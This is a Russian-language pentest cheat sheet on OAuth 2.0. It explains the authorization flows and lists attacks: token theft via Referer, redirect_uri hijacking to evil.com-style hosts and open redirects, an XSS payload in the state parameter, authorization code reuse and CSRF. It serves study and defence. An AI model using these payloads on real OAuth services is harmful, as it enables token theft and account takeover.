> **OAuth** — это широко используемая структура авторизации, которая позволяет веб-сайтам и веб-приложениям запрашивать ограниченный доступ к учетной записи пользователя в другом приложении. Что особенно важно, OAuth позволяет пользователю предоставлять этот доступ, не раскрывая свои учетные данные для входа запрашивающему приложению. Это означает, что пользователи могут точно настраивать, какими данными они хотят поделиться, вместо того, чтобы передавать полный контроль над своей учетной записью третьей стороне.

*  [Кража токена OAuth через Referer](#Кража-токена-OAuth-через-Referer)
*  [Перехват токена OAuth через redirect_uri](#Перехват-токена-OAuth-через-redirect_uri)
*  [Выполнение XSS через redirect_uri](#Выполнение-XSS-через-redirect_uri)
*  [Раскрытие закрытого ключа OAuth](#Раскрытие-закрытого-ключа-OAuth)
*  [Нарушение правил использования authorization code](#Нарушение-правил-использования-authorization-code)
*  [Межсайтовая подделка запроса (CSRF)](#Межсайтовая-подделка-запроса-CSRF)

# Базовая базО

### Как работает OAuth 2.0?

* Клиентское приложение — веб-сайт или веб-приложение, которое хочет получить доступ к данным пользователя.
* Владелец ресурса — пользователь, к данным которого клиентское приложение хочет получить доступ.
* Поставщик услуг OAuth — веб-сайт или приложение, которое контролирует данные пользователя и доступ к ним. Они поддерживают OAuth, предоставляя API для взаимодействия как с сервером авторизации, так и с сервером ресурсов.

Существует множество различных способов реализации фактического процесса OAuth. Они известны как «потоки» OAuth или «типы предоставления».

```«код авторизации»``` и ```«неявный»``` типаы предоставления в целом включают следующие этапы:

1. Клиентское приложение запрашивает доступ к подмножеству данных пользователя, указывая, какой тип предоставления он хочет использовать и какой вид доступа он хочет.
2. Пользователю предлагается войти в службу OAuth и явно дать свое согласие на запрошенный доступ.
3. Клиентское приложение получает уникальный токен доступа, который подтверждает, что у него есть разрешение от пользователя на доступ к запрошенным данным. То, как именно это происходит, значительно различается в зависимости от типа предоставления.
4. Клиентское приложение использует этот токен доступа для выполнения вызовов API, извлекая соответствующие данные с сервера ресурсов.

> Хотя OAuth 2.0 является текущим стандартом, некоторые веб-сайты по-прежнему используют устаревшую версию 1a. OAuth 2.0 был написан с нуля, а не разработан непосредственно на основе OAuth 1.0. 

* **Области действия OAuth**

Для базового OAuth области, для которых клиентское приложение может запросить доступ, уникальны для каждой службы OAuth. Поскольку имя области действия представляет собой просто произвольную текстовую строку, формат может существенно различаться у разных поставщиков. Некоторые даже используют полный URI в качестве имени области действия, аналогично конечной точке REST API.

Запрос доступа на чтение к списку контактов:
```
scope=contacts
scope=contacts.read
scope=contact-list-r
scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly
```

### Тип предоставления кода авторизации

![Тип предоставления кода авторизации](https://github.com/Kaupervud69/WebVuln/blob/main/OAuth/jpeg/oauth-authorization-code-flow.jpg "authcode")

# Кража токена OAuth через Referer

> У вас есть HTML-инъекция, но не получается выполнить XSS? На сайте есть реализации OAuth? Если да, настройте тег `img` на свой сервер и посмотрите, есть ли способ заставить жертву перейти туда (редирект и т.д.) после входа в систему, чтобы украсть OAuth-токены через заголовок referer.

# Перехват токена OAuth через `redirect_uri`

**Перенаправление на контролируемый домен для получения access token**
```python
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

**Перенаправление на разрешенный Open URL для получения access token**
```python
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```

> Реализации OAuth никогда не должны разрешать (whitelist) целые домены, а только конкретные URL-адреса, чтобы `redirect_uri` нельзя было указать на открытый редирект (Open Redirect).

Иногда необходимо изменить область видимости (`scope`) на недопустимую, чтобы обойти фильтр на `redirect_uri`:
```python
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```

# Выполнение XSS через `redirect_uri`
```python
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```

# Раскрытие закрытого ключа OAuth
Некоторые приложения для Android/iOS можно декомпилировать, и закрытый ключ OAuth может быть доступен.

# Нарушение правил использования authorization code
> **Клиент НЕ ДОЛЖЕН использовать код авторизации более одного раза.**

Если код авторизации используется более одного раза, сервер авторизации ДОЛЖЕН отклонить запрос и (по возможности) ДОЛЖЕН отозвать все токены, ранее выданные на основе этого кода авторизации.

# Межсайтовая подделка запроса (CSRF)

Приложения, которые не проверяют наличие действительного CSRF-токена в OAuth callback, уязвимы. Это можно эксплуатировать, инициировав OAuth-поток и перехватив callback (`https://example.com/callback?code=AUTHORIZATION_CODE`). Этот URL можно использовать в CSRF-атаках.

> Клиент ДОЛЖЕН реализовать защиту от CSRF для своего URI перенаправления (`redirection URI`). Обычно это достигается путем требования, чтобы любой запрос, отправленный на конечную точку URI перенаправления, включал значение, которое привязывает запрос к аутентифицированному состоянию пользовательского агента. Клиенту СЛЕДУЕТ использовать параметр запроса `state` для передачи этого значения серверу авторизации при выполнении запроса на авторизацию.
